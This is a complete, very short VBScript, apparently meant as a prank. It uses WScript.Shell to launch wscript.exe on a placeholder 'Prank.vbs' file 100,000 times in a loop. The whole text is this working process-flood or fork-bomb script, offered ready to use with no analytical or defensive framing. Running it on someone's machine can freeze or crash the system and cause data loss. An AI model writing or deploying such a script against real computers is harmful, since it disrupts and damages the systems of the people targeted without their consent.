Set WshShell = CreateObject("WScript.Shell")

For i = 1 To 100000
 WshShell.Run "wscript.exe ""C:\Path\To\Your\Prank.vbs"""
Next
